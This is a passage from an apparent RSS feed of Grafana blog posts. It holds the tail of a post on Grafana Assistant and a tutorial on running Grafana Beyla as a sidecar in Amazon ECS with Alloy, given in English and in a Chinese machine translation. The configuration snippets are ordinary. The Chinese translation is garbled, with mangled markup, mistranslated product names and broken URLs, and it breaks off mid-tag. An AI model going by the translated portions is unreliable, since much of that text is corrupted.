&lt;/strong&gt;进来的地方，可以让您与Grafana交谈并完成工作。在&#xA;&lt;a href =“/blog/2025/05/07/llm-grafana-rassistant/“”&gt; grafanacon 2025 &lt;/a&gt;，Grafana Assistant与Grafana Ecosystem深入融合，将相关的可观察性与您的相关观察性背景相同&#xA;&lt;p&gt;我们不仅在使数据民主化，而且我们正在民主化观察力的体验本身，还可以使用自然语言来，找到地方，找到东西，创建仪表板或询问有关您的数据的问题。这是Grafana助手发光的地方，使日常用户可以更有效地使用Grafana。&lt;/p&gt;&#xA;&lt;h2 id =“挑战 - 可靠的可靠 - 模块化代理”&gt;挑战：朝着可靠的，模块化的剂&lt;/h2&gt;迈进&#xA;&lt;p&gt;这里的最终目标是使从Grafana中获得最大收益变得更加容易，但是构建并不容易。 “问任何事物”的经历很难创造，因为人们可能会询问其Grafana实例的一百万个问题。&lt;/p&gt;&#xA;&lt;p&gt;可观察性工作流程很复杂，每个用户的环境都是唯一的。因此，为了建立一个强大而可靠的代理，我们关注一些关键领域：&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt; &lt;strong&gt;评估：&lt;/strong&gt;我们已经超越了“ Vibe测试”（即“感觉正确吗？”），转变为可复制评估的框架。我们在受控的Grafana环境中测试了代理商在一组场景中测试，以确保每种变化都会提高质量并不会导致回归。&lt;/li&gt;&#xA;&lt;li&gt; &lt;strong&gt;降低令牌噪声：&lt;/strong&gt; API通常返回像JSON这样的结构化数据。虽然非常适合机器，但对于LLM来说是“嘈杂的”。我们发现，通过将API响应预先处理为更自然，语义上更丰富的句子，我们可以将令牌用法减少高达4倍，从而降低成本，降低延迟并实际上改善了LLM＆RSQuo; s性能。&lt;/li&gt;&#xA;&lt;li&gt; &lt;strong&gt;多代理体系结构：&lt;/strong&gt;我们从尝试做所有事情的单一单层代理人开始。现在，我们正在考虑建立一个“专家”系统。中央协调员代理接收用户的请求，并将其委派给专业的代理，例如仪表板代理，查询代理或支持代理。这种模块化设计更容易进行调试和扩展，并且使整个系统更强大。&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 id =“放置 - 智力 - 与格拉法纳 - 助手”&gt;将其与Grafana Assistant &lt;/h2&gt;一起付诸实践&#xA;&lt;p&gt;从简单聊天到使用工具的多步代理的旅程是我们建立Grafana助手的原因，但我们才刚刚开始。 AI空间正在发展，我们希望站在前面，提供重要的AI工作流程。为此，我们正在尝试数据结构，专业代理和评估框架。&lt;/p&gt;&#xA;&lt;p&gt;如果您有兴趣参与要建造的内容：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;查看开源&#xA;&lt;a href =“ https://github.com/grafana/mcp-grafana” target =“ _ blank” rel =“ noopener noreferrer”&gt; github上的grafana mcp服务器&#xA;&lt;li&gt;，当然，&#xA;&lt;a href =“ https://docs.google.com/forms/d/e/1faipqlsfnuw6efnuw6efbljqis-fkt0jt0jt8e4tisms_ruzr6wpxfk8pafk8paq0-paq0-paq0-mlw/view/view for亲自经历可观察性的未来。&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt; &lt;em&gt;&#xA;&lt;a href =“/products/cloud/？pg = blog＆plcmt = body-txt”&gt; grafana cloud &lt;/a&gt;是从指标，日志，痕迹，痕迹，仪表板等开始的最简单方法。我们有一个宽敞的永远的层次，并为每个用例都有计划。&#xA;&lt;a href =“//auth/ign-up/create-user/？pg = blog＆plcmt = body-txt”&gt;现在免费注册&lt;/a&gt;！&lt;/em&gt; &lt;/em&gt; &lt;/p&gt;</description>
      <pubDate>Mon, 30 Jun 2025 00:00:00 +0000</pubDate>
    </item>
    <item>
      <title>【Observability for containerized workloads: How to run Grafana Beyla as a sidecar in Amazon ECS】容器化工作负载的可观察性：如何在Amazon ECS中运行Grafana Beyla作为边缘</title>
      <link>https://grafana.com/blog/2025/07/09/observability-for-containerized-workloads-how-to-run-grafana-beyla-as-a-sidecar-in-amazon-ecs/</link>
      <description>【&lt;p&gt;&lt;em&gt;Note: Grafana Beyla&#xA;&lt;a href=&#34;/blog/2025/05/07/opentelemetry-ebpf-instrumentation-beyla-donation/&#34;&gt;has been donated&lt;/a&gt; to OpenTelemetry under the new project name OpenTelemetry eBPF Instrumentation. Beyla will continue to exist as Grafana Labs’ distribution of the upstream project.&lt;/em&gt; &lt;/p&gt;&#xA;&lt;p&gt;&#xA;&lt;a href=&#34;/oss/beyla-ebpf/?pg=blog&amp;amp;plcmt=body-txt&#34;&gt;Grafana Beyla&lt;/a&gt; is an open source eBPF-based auto-instrumentation tool that helps you easily get started with application observability, allowing you to monitor and visualize traces without modifying the application code.&#xA;&lt;a href=&#34;https://aws.amazon.com/ecs/&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;Amazon Elastic Container Service (ECS)&lt;/a&gt;, meanwhile, is a fully managed container orchestration service in AWS.&lt;/p&gt;&#xA;&lt;p&gt;In this blog post, we’ll explore how to integrate Grafana Beyla with Amazon ECS to enhance application observability within Amazon’s managed, containerized environment. With Beyla’s eBPF-based auto-instrumentation, you can achieve deep visibility into containerized workloads without code changes, accelerating time-to-market and reducing engineering overhead.  &lt;/p&gt;&#xA;&lt;p&gt;Specifically, we’ll cover the configuration requirements to run Beyla as a&#xA;&lt;a href=&#34;https://kubernetes.io/docs/concepts/workloads/pods/sidecar-containers/&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;sidecar&lt;/a&gt; in an ECS&#xA;&lt;a href=&#34;https://docs.aws.amazon.com/AmazonECS/latest/developerguide/task_definitions.html&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;task&lt;/a&gt;, which is the smallest unit of execution in an ECS cluster (think of an ECS task like a Kubernetes pod).&lt;/p&gt;&#xA;&lt;p&gt;In the following example, we’ll use ECS running on&#xA;&lt;a href=&#34;https://aws.amazon.com/ec2/&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;Amazon Elastic Compute Cloud (EC2)&lt;/a&gt;, which is an important distinction given that Beyla is not supported with ECS in&#xA;&lt;a href=&#34;https://aws.amazon.com/fargate/&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;AWS Fargate&lt;/a&gt;. This is because ECS in Fargate doesn’t support eBPF, which is the technology Beyla uses to instrument your applications. We’ll also also use&#xA;&lt;a href=&#34;/oss/alloy-opentelemetry-collector/?pg=blog&amp;amp;plcmt=body-txt&#34;&gt;Grafana Alloy&lt;/a&gt; — an open source OpenTelemetry collector with built-in Prometheus pipelines and support for metrics, logs, traces, and profiles — to send all telemetry data to&#xA;&lt;a href=&#34;/products/cloud/?pg=blog&amp;amp;plcmt=body-txt&#34;&gt;Grafana Cloud&lt;/a&gt;.&lt;/p&gt;&#xA;&lt;p&gt;You can find more information on this topic, and some of the code examples included here, in this&#xA;&lt;a href=&#34;https://github.com/mwimpelberg28/ecsbeyla/tree/main&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;GitHub repo&lt;/a&gt;. &lt;/p&gt;&#xA;&lt;h2 id=&#34;running-alloy-in-ecs&#34;&gt;Running Alloy in ECS&lt;/h2&gt;&#xA;&lt;p&gt;Grafana Beyla is available in Alloy as the default eBPF-based application auto-instrumentation solution. The following steps will set up an OpenTelemetry listener in ECS via Alloy. You could also send traces directly to an&#xA;&lt;a href=&#34;https://opentelemetry.io/docs/specs/otel/protocol/&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;OpenTelemetry protocol (OTLP)&lt;/a&gt; endpoint within the application, but for this example, we’re using Alloy with an OpenTelemetry listener on either port 4317 for GRPC or 4318 for HTTP.  &lt;/p&gt;&#xA;&lt;p&gt;Create a configuration file in an&#xA;&lt;a href=&#34;https://docs.aws.amazon.com/systems-manager/latest/userguide/systems-manager-parameter-store.html&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;AWS Systems Manager Parameter Store&lt;/a&gt; and reference it from the ECS task definition. If you’re sending telemetry data to Grafana Cloud, it’s crucial that the service lives on a subnet that has internet access.&lt;/p&gt;&#xA;&lt;div class=&#34;code-snippet code-snippet__mini&#34;&gt;&lt;div class=&#34;lang-toolbar__mini&#34;&gt;&#xA;&lt;span class=&#34;code-clipboard&#34;&gt;&#xA;&lt;button x-data=&#34;app_code_snippet()&#34; x-init=&#34;init()&#34; @click=&#34;copy()&#34;&gt;&#xA;&lt;img class=&#34;code-clipboard__icon&#34; src=&#34;/media/images/icons/icon-copy-small-2.svg&#34; alt=&#34;Copy code to clipboard&#34; width=&#34;14&#34; height=&#34;13&#34;&gt;&#xA;&lt;span&gt;Copy&lt;/span&gt;&#xA;&lt;/button&gt;&#xA;&lt;/span&gt;&#xA;&lt;/div&gt;&lt;div class=&#34;code-snippet code-snippet__border&#34;&gt;&#xA;&lt;pre data-expanded=&#34;false&#34;&gt;&lt;code class=&#34;language-none&#34;&gt; &amp;#34;secrets&amp;#34;: [&#xA;{&#xA;&amp;#34;name&amp;#34;: &amp;#34;ALLOY_CONFIG_CONTENT&amp;#34;,&#xA;&amp;#34;valueFrom&amp;#34;: &amp;#34;collector-config&amp;#34;&#xA;}&#xA;],&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;The&#xA;&lt;a href=&#34;https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles.html&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;IAM role&lt;/a&gt; that runs the task must have permission to read from the parameter store, as well. Port 4318 (HTTP) must be open in order for Beyla to send telemetry data to Alloy. Alternatively, if you’d like to send your telemetry data in GRPC format, you can expose port 4317 and then change the Beyla export settings accordingly.&lt;/p&gt;&#xA;&lt;div class=&#34;code-snippet code-snippet__mini&#34;&gt;&lt;div class=&#34;lang-toolbar__mini&#34;&gt;&#xA;&lt;span class=&#34;code-clipboard&#34;&gt;&#xA;&lt;button x-data=&#34;app_code_snippet()&#34; x-init=&#34;init()&#34; @click=&#34;copy()&#34;&gt;&#xA;&lt;img class=&#34;code-clipboard__icon&#34; src=&#34;/media/images/icons/icon-copy-small-2.svg&#34; alt=&#34;Copy code to clipboard&#34; width=&#34;14&#34; height=&#34;13&#34;&gt;&#xA;&lt;span&gt;Copy&lt;/span&gt;&#xA;&lt;/button&gt;&#xA;&lt;/span&gt;&#xA;&lt;/div&gt;&lt;div class=&#34;code-snippet code-snippet__border&#34;&gt;&#xA;&lt;pre data-expanded=&#34;false&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;{&#xA;&amp;#34;name&amp;#34;: &amp;#34;http&amp;#34;,&#xA;&amp;#34;containerPort&amp;#34;: 4318,&#xA;&amp;#34;hostPort&amp;#34;: 4318,&#xA;&amp;#34;protocol&amp;#34;: &amp;#34;tcp&amp;#34;,&#xA;&amp;#34;appProtocol&amp;#34;: &amp;#34;http&amp;#34;&#xA;}&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;Finally, Alloy will use&#xA;&lt;a href=&#34;https://aws.amazon.com/blogs/aws/amazon-ecs-service-discovery/&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;service discovery&lt;/a&gt; with a DNS name so that Beyla can send telemetry data to it.&lt;/p&gt;&#xA;&lt;figure&#xA;class=&#34;figure-wrapper figure-wrapper__lightbox w-100p &#34;&#xA;style=&#34;max-width: 1270px;&#34;&#xA;itemprop=&#34;associatedMedia&#34;&#xA;itemscope=&#34;&#34;&#xA;itemtype=&#34;http://schema.org/ImageObject&#34;&#xA;&gt;&lt;a&#xA;class=&#34;lightbox-link&#34;&#xA;href=&#34;/media/blog/grafana-beyla-ecs-sidecar/service-discovery-optional.png&#34;&#xA;itemprop=&#34;contentUrl&#34;&#xA;&gt;&lt;div class=&#34;img-wrapper w-100p h-auto&#34;&gt;&lt;img&#xA;class=&#34;lazyload &#34;&#xA;data-src=&#34;/media/blog/grafana-beyla-ecs-sidecar/service-discovery-optional.png&#34;data-srcset=&#34;/media/blog/grafana-beyla-ecs-sidecar/service-discovery-optional.png?w=320 320w, /media/blog/grafana-beyla-ecs-sidecar/service-discovery-optional.png?w=550 550w, /media/blog/grafana-beyla-ecs-sidecar/service-discovery-optional.png?w=750 750w, /media/blog/grafana-beyla-ecs-sidecar/service-discovery-optional.png?w=900 900w, /media/blog/grafana-beyla-ecs-sidecar/service-discovery-optional.png?w=1040 1040w, /media/blog/grafana-beyla-ecs-sidecar/service-discovery-optional.png?w=1240 1240w, /media/blog/grafana-beyla-ecs-sidecar/service-discovery-optional.png?w=1920 1920w&#34;&#xA;data-sizes=&#34;auto&#34;alt=&#34;A screenshot of the service discovery page for Amazon ECS.&#34;width=&#34;1270&#34;height=&#34;840&#34;/&gt;&#xA;&lt;noscript&gt;&#xA;&lt;img&#xA;src=&#34;/media/blog/grafana-beyla-ecs-sidecar/service-discovery-optional.png&#34;&#xA;alt=&#34;A screenshot of the service discovery page for Amazon ECS.&#34;width=&#34;1270&#34;height=&#34;840&#34;/&gt;&#xA;&lt;/noscript&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&#xA;&lt;h2 id=&#34;running-a-sample-application-with-beyla&#34;&gt;Running a sample application with Beyla&lt;/h2&gt;&#xA;&lt;p&gt;For our example, we’ll leverage an existing sample&#xA;&lt;a href=&#34;https://github.com/mariomac/goblog&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;application&lt;/a&gt; written in Go. In the task definition, the parameter &lt;code&gt;“pidMode”:”task”&lt;/code&gt; must be specified. This allows Beyla to read process IDS (PIDs) from other containers in the same service. In Docker or Kubernetes, this option is equivalent to setting the PID mode of the Beyla sidecar container to match the one of the service being instrumented.&lt;/p&gt;&#xA;&lt;div class=&#34;code-snippet code-snippet__mini&#34;&gt;&lt;div class=&#34;lang-toolbar__mini&#34;&gt;&#xA;&lt;span class=&#34;code-clipboard&#34;&gt;&#xA;&lt;button x-data=&#34;app_code_snippet()&#34; x-init=&#34;init()&#34; @click=&#34;copy()&#34;&gt;&#xA;&lt;img class=&#34;code-clipboard__icon&#34; src=&#34;/media/images/icons/icon-copy-small-2.svg&#34; alt=&#34;Copy code to clipboard&#34; width=&#34;14&#34; height=&#34;13&#34;&gt;&#xA;&lt;span&gt;Copy&lt;/span&gt;&#xA;&lt;/button&gt;&#xA;&lt;/span&gt;&#xA;&lt;/div&gt;&lt;div class=&#34;code-snippet code-snippet__border&#34;&gt;&#xA;&lt;pre data-expanded=&#34;false&#34;&gt;&lt;code class=&#34;language-none&#34;&gt; &amp;#34;pidMode&amp;#34;: &amp;#34;task&amp;#34;,&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;The appropriate Beyla parameters must be sent, as well as the receiver for Alloy. &lt;/p&gt;&#xA;&lt;div class=&#34;code-snippet code-snippet__mini&#34;&gt;&lt;div class=&#34;lang-toolbar__mini&#34;&gt;&#xA;&lt;span class=&#34;code-clipboard&#34;&gt;&#xA;&lt;button x-data=&#34;app_code_snippet()&#34; x-init=&#34;init()&#34; @click=&#34;copy()&#34;&gt;&#xA;&lt;img class=&#34;code-clipboard__icon&#34; src=&#34;/media/images/icons/icon-copy-small-2.svg&#34; alt=&#34;Copy code to clipboard&#34; width=&#34;14&#34; height=&#34;13&#34;&gt;&#xA;&lt;span&gt;Copy&lt;/span&gt;&#xA;&lt;/button&gt;&#xA;&lt;/span&gt;&#xA;&lt;/div&gt;&lt;div class=&#34;code-snippet code-snippet__border&#34;&gt;&#xA;&lt;pre data-expanded=&#34;false&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;&amp;#34;environment&amp;#34;: [&#xA;{&#xA;&amp;#34;name&amp;#34;: &amp;#34;BEYLA_EXECUTABLE_NAME&amp;#34;,&#xA;&amp;#34;value&amp;#34;: &amp;#34;goblog&amp;#34;&#xA;},&#xA;{&#xA;&amp;#34;name&amp;#34;: &amp;#34;BEYLA_OPEN_PORT&amp;#34;,&#xA;&amp;#34;value&amp;#34;: &amp;#34;8443&amp;#34;&#xA;},&#xA;{&#xA;&amp;#34;name&amp;#34;: &amp;#34;OTEL_EXPORTER_OTLP_TRACES_ENDPOINT&amp;#34;,&#xA;&amp;#34;value&amp;#34;: &amp;#34;http://alloy-receiver.alloy:4318&amp;#34;&#xA;}&#xA;],&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;For my service, I elected to use a load balancer to port 8443 since my sample web application runs on port 8443. In addition, it’s crucial that the service is in the same namespace as Alloy so that it can communicate with the receiver.&lt;/p&gt;&#xA;&lt;p&gt;Once the data is received in&#xA;&lt;a href=&#34;/products/cloud/traces//?pg=blog&amp;amp;plcmt=body-txt&#34;&gt;Grafana Cloud Traces&lt;/a&gt; — the fully managed distributed tracing system powered by Grafana Tempo — you can query it alongside all other traces, regardless of source, to monitor and optimize application performance. The example below shows the TraceQL result, but metrics are also&#xA;&lt;a href=&#34;/docs/grafana-cloud/send-data/traces/metrics-generator/?pg=blog&amp;amp;plcmt=body-txt&#34;&gt;generated from Cloud Traces automatically&lt;/a&gt;, which enables&#xA;&lt;a href=&#34;/docs/grafana-cloud/monitor-applications/application-observability/?pg=blog&amp;amp;plcmt=body-txt&#34;&gt;Grafana Cloud Application Observability&lt;/a&gt;.&lt;/p&gt;&#xA;&lt;figure&#xA;class=&#34;figure-wrapper figure-wrapper__lightbox w-100p &#34;&#xA;style=&#34;max-width: 1164px;&#34;&#xA;itemprop=&#34;associatedMedia&#34;&#xA;itemscope=&#34;&#34;&#xA;itemtype=&#34;http://schema.org/ImageObject&#34;&#xA;&gt;&lt;a&#xA;class=&#34;lightbox-link&#34;&#xA;href=&#34;/media/blog/grafana-beyla-ecs-sidecar/grafana-cloud-traces.png&#34;&#xA;itemprop=&#34;contentUrl&#34;&#xA;&gt;&lt;div class=&#34;img-wrapper w-100p h-auto&#34;&gt;&lt;img&#xA;class=&#34;lazyload &#34;&#xA;data-src=&#34;/media/blog/grafana-beyla-ecs-sidecar/grafana-cloud-traces.png&#34;data-srcset=&#34;/media/blog/grafana-beyla-ecs-sidecar/grafana-cloud-traces.png?w=320 320w, /media/blog/grafana-beyla-ecs-sidecar/grafana-cloud-traces.png?w=550 550w, /media/blog/grafana-beyla-ecs-sidecar/grafana-cloud-traces.png?w=750 750w, /media/blog/grafana-beyla-ecs-sidecar/grafana-cloud-traces.png?w=900 900w, /media/blog/grafana-beyla-ecs-sidecar/grafana-cloud-traces.png?w=1040 1040w, /media/blog/grafana-beyla-ecs-sidecar/grafana-cloud-traces.png?w=1240 1240w, /media/blog/grafana-beyla-ecs-sidecar/grafana-cloud-traces.png?w=1920 1920w&#34;&#xA;data-sizes=&#34;auto&#34;alt=&#34;A screenshot of Grafana Cloud Traces.&#34;width=&#34;1164&#34;height=&#34;1556&#34;/&gt;&#xA;&lt;noscript&gt;&#xA;&lt;img&#xA;src=&#34;/media/blog/grafana-beyla-ecs-sidecar/grafana-cloud-traces.png&#34;&#xA;alt=&#34;A screenshot of Grafana Cloud Traces.&#34;width=&#34;1164&#34;height=&#34;1556&#34;/&gt;&#xA;&lt;/noscript&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&#xA;&lt;h2 id=&#34;wrapping-up&#34;&gt;Wrapping up &lt;/h2&gt;&#xA;&lt;p&gt;Integrating Grafana Beyla with Amazon ECS delivers immediate and long-term business value by dramatically simplifying the path to robust application observability. Ultimately, adopting this approach enhances service reliability, increases developer productivity, and supports business agility by providing a scalable, open source observability solution purpose-built for modern cloud environments.&lt;/p&gt;&#xA;&lt;p&gt;To learn more, please check out our documentation for both&#xA;&lt;a href=&#34;/docs/beyla/latest/?pg=blog&amp;amp;plcmt=body-txt&#34;&gt;Grafana Beyla&lt;/a&gt; and&#xA;&lt;a href=&#34;/docs/alloy/latest/?pg=blog&amp;amp;plcmt=body-txt&#34;&gt;Grafana Alloy&lt;/a&gt;, as well as this&#xA;&lt;a href=&#34;https://github.com/mwimpelberg28/ecsbeyla/tree/main&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt; GitHub repo&lt;/a&gt;. &lt;/p&gt;&#xA;&lt;p&gt;&lt;em&gt;&#xA;&lt;a href=&#34;/products/cloud/?pg=blog&amp;amp;plcmt=body-txt&#34;&gt;Grafana Cloud&lt;/a&gt; is the easiest way to get started with metrics, logs, traces, dashboards, and more. We have a generous forever-free tier and plans for every use case.&#xA;&lt;a href=&#34;/auth/sign-up/create-user/?pg=blog&amp;amp;plcmt=body-txt&#34;&gt;Sign up for free now&lt;/a&gt;!&lt;/em&gt;&lt;/p&gt;】&lt;p&gt; &lt;em&gt;注意：grafana beyla&#xA;&lt;a href =“/blog/2025/05/07/opentelemetry-ebpf-instrumentation-beyla-donation/“”&gt;已捐赠给OpenTElemetry，该项目名称opentelemetry ebpf仪器。 Beyla将继续存在Grafana Labs的上游项目的分布。&lt;/em&gt; &lt;/p&gt;&#xA;&lt;p&gt;&#xA;&lt;a href =“/oss/beyla-ebpf/？pg = blog＆plcmt = body-txt”&gt; grafana beyla &lt;/a&gt;是一种开源的基于开源的基于EBPF的自动启动工具，可帮助您轻松启动应用程序可观察力，使您可以在不修改应用程序代码的情况下监视和可视化跟踪。&#xA;&lt;a href =“ https://aws.amazon.com/ecs/” target =“ _ blank” rel =“ noopener noreferrer”&gt; Amazon弹性容器服务（ECS）&lt;/a&gt;与此同时，是AWS中的一个完全管理的容器编排服务&#xA;&lt;p&gt;在这篇博客文章中，我们将探讨如何将Grafana Beyla与Amazon ECS整合在一起，以增强亚马逊管理的，容器化的环境中的应用程序可观察性。借助Beyla的基于EBPF的自动启动，您可以在没有代码更改的情况下深入了解容器化工作负载，加速上市时间并减少工程开销。  &lt;/p&gt;&#xA;&lt;p&gt;具体来说，我们将涵盖配置要求，以将beyla作为一个&#xA;&lt;a href =“ https://kubernetes.io/docs/conectes/workloads/pods/pods/sidecar-containers/” target =“ _ black” rel =“ noopener noreferrer”&gt; sidecar &lt;/a&gt;&#xA;&lt;a href =“ https://docs.aws.amazon.com/amazonecs/latest/developerguide/task_definitions.html” target =“ _ black” rel =“ noopener noreferrer”&gt;豆荚）。&lt;/p&gt;&#xA;&lt;p&gt;在以下示例中，我们将使用运行的ECS&#xA;&lt;a href =“ https://aws.amazon.com/ec2/” target =“ _ blank” rel =“ noopener noreferrer”&gt; Amazon Elastic Compute Cloud（EC2）&lt;/a&gt;，这是一个重要的区别，鉴于Beyla在beyla中不支持ECS&#xA;&lt;a href =“ https://aws.amazon.com/fargate/” target =“ _ blank” rel =“ noopener noreferrer”&gt; aws fargate &lt;/a&gt;。这是因为Fargate的ECS不支持EBPF，这是Beyla用来启动应用程序的技术。我们也将使用&#xA;&lt;a href =“/oss/Alloy-opentelemetry-collector/？pg = blog＆plcmt = body-txt”&gt; grafana Alloy &lt;/a&gt;  - 一个开源的OpentElemetry收集器，带有内置的Prometheus Prometheus管道和对衡量指标，登录和配置文件的支持 - 发送所有电视数据 - &#xA;&lt;a href =“/products/cloud/？pg = blog＆plcmt = body-txt”&gt; grafana cloud &lt;/a&gt;。&lt;/p&gt;&#xA;&lt;p&gt;您可以找到有关此主题的更多信息，此处包括一些代码示例&#xA;&lt;a href =“ https://github.com/mwimpelberg28/ecsbeyla/tree/main” target =“ _ blank” rel =“ noopener noreferrer”&gt; github repo &lt;/a&gt;。 &lt;/p&gt;&#xA;&lt;H2 ID =“跑步合金”&gt;在ECS中运行合金&lt;/h2&gt;&#xA;&lt;p&gt; Grafana beyla在合金中可作为基于默认的EBPF应用程序自动启动解决方案提供。以下步骤将通过Alloy在ECS中设置OpenTelemetry侦听器。您也可以直接将轨迹发送到&#xA;&lt;a href =“ https：//opentelemetry.io/docs/specs/otel/protocol/“ target =“ _ blamb” rel =“ noopener noreferrer”&gt; opentelemetry协议（OTLP）&lt;/a&gt;应用程序中的端点&#xA;&lt;p&gt;在一个中创建一个配置文件&#xA;&lt;a href =“ https://docs.aws.amazon.com/systems-manager/latest/userguide/systems-systems-manager-parameter-store.html” target =“ _ black” rel =“ rel =“ noopener noreferrer”&gt; aws noreferrer“如果您将遥测数据发送到Grafana Cloud，那么该服务依赖于具有Internet访问的子网。&lt;/p&gt;&#xA;&lt;div class =“ code-snippet code-snippet__mini”&gt; &lt;div class =“ lang-toolbar__mini”&gt;&#xA;&lt;span class =“ code-clipboard”&gt;&#xA;&lt;button x-data =“ app_code_snippet（）” x-init =“ init（）” @click =“ copy（）”&gt;&#xA;&lt;img class =“ code-clipboard__icon” src =“/媒体/images/icons/icon-copy-small-2.svg” alt =“复制代码到剪贴板” width =“ 14”高度=“ 13”&gt;&#xA;&lt;span&gt;复制&lt;/span&gt;&#xA;&lt;/button&gt;&#xA;&lt;/span&gt;&#xA;&lt;/div&gt; &lt;div class =“代码 - 尼珀代码snippet__border”&gt;&#xA;&lt;pre data-expanded =“ false”&gt; &lt;code class =“ language-none”&gt;“ secrets”：[&#xA;{&#xA;“名称”：“ Alloy_config_content”，&#xA;“ valum from”：“ collector-config”&#xA;}&#xA;]，&lt;/code&gt; &lt;/pre&gt;&#xA;&lt;/div&gt;&#xA;&lt;/div&gt; &lt;p&gt;&#xA;&lt;a href =“ https://docs.aws.amazon.com/iam/latest/userguide/id_roles.html” target =“ _ black” rel =“ noopener noreferrer”&gt; iam角色&lt;/a&gt;该任务必须从参数存储中读取该任务。必须打开端口4318（HTTP），以使Beyla将遥测数据发送给合金。另外，如果您想以GRPC格式发送遥测数据，则可以暴露端口4317，然后相应地更改Beyla导出设置。&lt;/p&gt;&#xA;&lt;div class =“ code-snippet code-snippet__mini”&gt; &lt;div class =“ lang-toolbar__mini”&gt;&#xA;&lt;span class =“ code-clipboard”&gt;&#xA;&lt;button x-data =“ app_code_snippet（）” x-init =“ init（）” @click =“ copy（）”&gt;&#xA;&lt;img class =“ code-clipboard__icon” src =“/媒体/images/icons/icon-copy-small-2.svg” alt =“复制代码到剪贴板” width =“ 14”高度=“ 13”&gt;&#xA;&lt;span&gt;复制&lt;/span&gt;&#xA;&lt;/button&gt;&#xA;&lt;/span&gt;&#xA;&lt;/div&gt; &lt;div class =“代码 - 尼珀代码snippet__border”&gt;&#xA;&lt;pre data-expanded =“ false”&gt; &lt;code class =“ language-none”&gt; {&#xA;“名称”：“ http”，&#xA;“容器”：4318，&#xA;“ Hostport”：4318，&#xA;“协议”：“ TCP”，&#xA;“ AppProtocol”：“ HTTP”&#xA;} &lt;/code&gt; &lt;/pre&gt;&#xA;&lt;/div&gt;&#xA;&lt;/div&gt; &lt;p&gt;最后，合金将使用&#xA;&lt;a href =“ https://aws.amazon.com/blogs/aws/amazon-ecs-service-discovery/” target =“ _ black” rel =“ noopener noreferrer”&gt;服务发现&lt;/a&gt;带有dns名称，以便beyla可以向其发送远程数据数据。&#xA;&lt;图&#xA;class =“ figup-wrapper figuper-wrapper__lightbox W-100P”&#xA;样式=“最大宽度：1270px;”&#xA;itemprop =“ iSsectedmedia”&#xA;itemScope =“”&#xA;itemType =“ http://schema.org/imageObject”&#xA;&gt; &lt;a&#xA;class =“ Lightbox-link”&#xA;href =“/媒体/博客/grafana-beyla-ecs-sidecar/service-discovery-optional.png”&#xA;itemprop =“ contenturl”&#xA;&gt; &lt;div class =“ img-wrapper W-100P H-auto”&gt; &lt;img&#xA;class =“ Lazyload”&#xA;data-src =“ /media/blog/grafana-beyla-ecs-sidecar/service-discovery-optional.png&#34;data-srcset=&#34;/media/media/blog/blog/grafana-beyla-ecs-sidecar/service-discovery-covery-optional-optional-optional.png = 320w＆png = 320w 320W /Media/blog/grafana-beyla-ecs-sidecar/service-discovery-optional.png?w=550 550W，/media/blog/grafana-beyla-ecs-sidecar/service-discovery-discovery-optional-optional.png？ /Media/blog/grafana-beyla-ecs-sidecar/service-discovery-optional.png?w=900 900W，/media/Blog/grafana-beyla-ecs-sidecar/service-discovery-discovery-optional-optional.png?w=1040 1040w， /Media/blog/grafana-beyla-ecs-sidecar/service-discovery-optional.png?w=1240 1240W，/media/Blog/grafana-beyla-ecs-beyla-ecs-sidecar/service-discovery-optional-optional.png?w=1920 192020w&#39;&#xA;data-sizes =“ auto” alt =“亚马逊ECS服务发现页面的屏幕截图。” width =“ 1270” height =“ 840”/&gt;&#xA;&lt;NoScript&gt;&#xA;&lt;img&#xA;src =“/媒体/博客/grafana-beyla-ecs-sidecar/service-discovery-optional.png”&#xA;alt =“亚马逊ECS的服务发现页面的屏幕截图。” width =“ 1270” height =“ 840”/&gt;&#xA;&lt;/noscript&gt; &lt;/div&gt; &lt;/a&gt; &lt;/figie&gt;&#xA;&lt;H2 ID =“ runn-a-sample-application-with-beyla”&gt;使用beyla &lt;/h2&gt;运行样本应用程序&#xA;&lt;p&gt;在我们的示例中，我们将利用现有样本&#xA;&lt;a href =“ https://github.com/mariomac/goblog” target =“ _ blank” rel =“ noopener noreferrer”&gt; application &lt;/a&gt; &lt;/a&gt;写在GO中。在任务定义中，必须指定参数&lt;code&gt;“ pidmode”：“任务” &lt;/code&gt;。这允许Beyla读取同一服务中其他容器的过程ID（PID）。在Docker或Kubernetes中，此选项等效于设置Beyla Sidecar容器的PID模式以匹配所仪器的服务之一。&lt;/p&gt;&#xA;&lt;div class =“ code-snippet code-snippet__mini”&gt; &lt;div class =“ lang-toolbar__mini”&gt;&#xA;&lt;span class =“ code-clipboard”&gt;&#xA;&lt;button x-data =“ app_code_snippet（）” x-init =“ init（）” @click =“ copy（）”&gt;&#xA;&lt;img class =“ code-clipboard__icon” src 